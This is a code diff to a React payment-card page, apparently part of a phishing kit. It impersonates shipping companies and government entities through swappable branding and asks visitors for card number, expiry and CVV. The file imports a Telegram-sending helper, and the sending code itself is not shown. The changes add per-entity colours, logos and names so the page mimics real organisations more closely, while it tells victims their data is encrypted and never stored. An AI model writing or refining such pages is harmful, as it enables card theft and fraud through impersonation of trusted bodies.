@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useMemo, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -6,7 +6,7 @@ import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, AlertCircle, Lock, ShieldCheck, Sparkles } from "lucide-react";
+import { Shield, CreditCard, AlertCircle, Lock, ShieldCheck, Sparkles, Building2, Truck, Wallet } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { Card } from "@/components/ui/card";
@@ -17,6 +17,7 @@ import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
 import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { getGovernmentLayout } from "@/components/GovernmentLayouts";
+import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -40,6 +41,51 @@ const PaymentCardForm = () => {
   const shippingInfo = linkData?.payload as any;
   const country = linkData?.payload?.country || "SA";
 
+  // Get entity visual spec
+  const entitySpec = useMemo(() => {
+    if (serviceKey) {
+      return getEntityVisualSpec(serviceKey);
+    }
+    return null;
+  }, [serviceKey]);
+
+  // Apply entity CSS variables
+  useEffect(() => {
+    if (entitySpec) {
+      const cssVars = specToCSSVariables(entitySpec);
+      const root = document.documentElement;
+      Object.entries(cssVars).forEach(([key, value]) => {
+        root.style.setProperty(key, value);
+      });
+      root.setAttribute('data-entity', entitySpec.entityId);
+      root.setAttribute('data-entity-category', entitySpec.category);
+    }
+    return () => {
+      const root = document.documentElement;
+      root.removeAttribute('data-entity');
+      root.removeAttribute('data-entity-category');
+    };
+  }, [entitySpec]);
+
+  // Visual values
+  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
+  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
+  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
+  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || designSystem.colors.neutral[900];
+  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
+  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
+  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || 'Cairo, sans-serif';
+  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
+  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
+  const inputHeight = entitySpec?.dimensions.inputHeight || '48px';
+  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
+  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
+  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || branding.logo;
+  const entityNameAr = entitySpec?.entityNameAr || branding.nameAr || serviceKey;
+  const entityNameEn = entitySpec?.entityNameEn || branding.nameEn || serviceKey;
+  const category = entitySpec?.category || 'shipping';
+
   const rawAmount = shippingInfo?.cod_amount;
   let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
@@ -54,15 +100,11 @@ const PaymentCardForm = () => {
   }
 
   const formattedAmount = `${amount} ر.س`;
-  
+
   const detectedEntity = detectEntityFromURL();
   const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
-  const displayLogo = entityLogo || branding.logo;
-  
-  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
-  const textColor = companyBranding?.colors.text || designSystem.colors.neutral[900];
-  
+  const displayLogo = entityLogo || logoUrl || branding.logo;
+
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
     const matches = cleaned.match(/.{1,4}/g);
@@ -144,45 +186,45 @@ const PaymentCardForm = () => {
   const renderForm = () => (
     <form onSubmit={handleSubmit} className="space-y-6">
       <div className="space-y-2">
-        <Label className="text-sm font-bold">اسم حامل البطاقة</Label>
+        <Label className="text-sm font-bold" style={{ color: textColor }}>اسم حامل البطاقة</Label>
         <Input
           placeholder="الاسم كما يظهر على البطاقة"
           value={cardName}
           onChange={(e) => setCardName(e.target.value)}
-          className="h-12 border-2 focus:ring-2"
-          style={{ borderColor: `${primaryColor}20` }}
+          className="transition-all"
+          style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }}
         />
       </div>
 
       <div className="space-y-2">
-        <Label className="text-sm font-bold">رقم البطاقة</Label>
+        <Label className="text-sm font-bold" style={{ color: textColor }}>رقم البطاقة</Label>
         <div className="relative">
           <Input
             placeholder="0000 0000 0000 0000"
             value={cardNumber}
             onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
             maxLength={19}
-            className="h-12 border-2 pr-12 font-mono"
-            style={{ borderColor: `${primaryColor}20` }}
+            className="font-mono transition-all"
+            style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px', paddingRight: '3rem' }}
           />
-          <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+          <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5" style={{ color: textLightColor }} />
         </div>
       </div>
 
       <div className="grid grid-cols-2 gap-4">
         <div className="space-y-2">
-          <Label className="text-sm font-bold">تاريخ الانتهاء</Label>
+          <Label className="text-sm font-bold" style={{ color: textColor }}>تاريخ الانتهاء</Label>
           <Input
             placeholder="MM/YY"
             value={expiry}
             onChange={(e) => setExpiry(formatExpiry(e.target.value))}
             maxLength={5}
-            className="h-12 border-2 text-center font-mono"
-            style={{ borderColor: `${primaryColor}20` }}
+            className="text-center font-mono transition-all"
+            style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px' }}
           />
         </div>
         <div className="space-y-2">
-          <Label className="text-sm font-bold">رمز الأمان (CVV)</Label>
+          <Label className="text-sm font-bold" style={{ color: textColor }}>رمز الأمان (CVV)</Label>
           <div className="relative">
             <Input
               placeholder="123"
@@ -190,26 +232,29 @@ const PaymentCardForm = () => {
               onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
               maxLength={3}
               type="password"
-              className="h-12 border-2 text-center font-mono"
-              style={{ borderColor: `${primaryColor}20` }}
+              className="text-center font-mono transition-all"
+              style={{ height: inputHeight, borderRadius, backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB', borderColor: entitySpec?.colors.inputBorder || '#E5E7EB', borderWidth: '2px', paddingRight: '3rem' }}
             />
-            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4" style={{ color: textLightColor }} />
           </div>
         </div>
       </div>
 
-      <Button 
+      <Button
         type="submit"
-        className="w-full h-14 text-lg font-bold shadow-lg transition-all hover:scale-[1.02]"
-        style={{ 
+        className="w-full text-lg font-bold shadow-xl transition-all hover:translate-y-[-2px]"
+        style={{
           background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-          color: '#FFFFFF'
+          boxShadow: buttonShadow,
+          borderRadius,
+          height: buttonHeight,
+          color: entitySpec?.colors.textOnPrimary || '#FFFFFF'
         }}
       >
         تأكيد الدفع ({formattedAmount})
       </Button>
 
-      <div className="flex items-center justify-center gap-4 pt-4 opacity-50">
+      <div className="flex items-center justify-center gap-4 pt-4" style={{ opacity: 0.5, filter: 'grayscale(1)' }}>
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4 w-auto" />
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6 w-auto" />
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Mada_Logo.svg/1200px-Mada_Logo.svg.png" alt="Mada" className="h-4 w-auto" />
@@ -257,12 +302,12 @@ const PaymentCardForm = () => {
         }
 
         return (
-          <div 
+          <div
             className="min-h-screen w-full flex flex-col"
             dir="rtl"
             style={{
-              background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
-              fontFamily: companyBranding?.fonts.arabic || 'Cairo, sans-serif'
+              background: `linear-gradient(135deg, ${backgroundColor}, ${surfaceColor})`,
+              fontFamily
             }}
           >
             <div className="w-full border-b bg-white shadow-sm" style={{ borderBottom: `3px solid ${primaryColor}` }}>
@@ -270,13 +315,13 @@ const PaymentCardForm = () => {
                 <div className="flex items-center gap-4">
                   {displayLogo && <img src={displayLogo} alt={serviceName} className="h-10 sm:h-12 w-auto object-contain" />}
                   <div className="hidden sm:block">
-                    <p className="text-base font-bold">{serviceName}</p>
-                    <p className="text-sm text-gray-500">الدفع الآمن</p>
+                    <p className="text-base font-bold" style={{ color: textColor }}>{serviceName}</p>
+                    <p className="text-sm" style={{ color: textLightColor }}>الدفع الآمن</p>
                   </div>
                 </div>
-                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
-                  <ShieldCheck className="w-4 h-4 text-green-600" />
-                  <span className="text-xs font-medium text-green-700">آمن</span>
+                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full border" style={{ backgroundColor: `${primaryColor}08`, color: primaryColor, borderColor: `${primaryColor}20` }}>
+                  <ShieldCheck className="w-4 h-4" />
+                  <span className="text-xs font-medium">آمن</span>
                 </div>
               </div>
             </div>
@@ -286,17 +331,17 @@ const PaymentCardForm = () => {
                 <div className="text-center mb-8">
                   <div className="flex items-center justify-center gap-3 mb-4">
                     <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
-                    <h1 className="text-3xl font-bold">بيانات البطاقة</h1>
+                    <h1 className="text-2xl sm:text-3xl font-bold" style={{ color: textColor }}>بيانات البطاقة</h1>
                   </div>
-                  <p className="text-gray-600">أدخل بيانات بطاقتك بشكل آمن</p>
+                  <p style={{ color: textLightColor }}>أدخل بيانات بطاقتك بشكل آمن</p>
                 </div>
 
-                <Card className="p-6 sm:p-8 shadow-2xl rounded-[20px] border-0">
-                  <div className="rounded-xl p-4 mb-6 flex items-start gap-3 bg-blue-50 border border-blue-100">
-                    <AlertCircle className="w-5 h-5 mt-0.5 text-blue-600" />
+                <Card className="p-6 sm:p-8 border-0" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
+                  <div className="rounded-xl p-4 mb-6 flex items-start gap-3 border" style={{ backgroundColor: `${primaryColor}08`, borderColor: `${primaryColor}20` }}>
+                    <AlertCircle className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                     <div className="text-sm">
-                      <p className="font-bold text-blue-900">حماية معلوماتك</p>
-                      <p className="text-xs text-blue-700">بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.</p>
+                      <p className="font-bold" style={{ color: primaryColor }}>حماية معلوماتك</p>
+                      <p className="text-xs" style={{ color: `${primaryColor}90` }}>بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.</p>
                     </div>
                   </div>
                   {renderForm()}
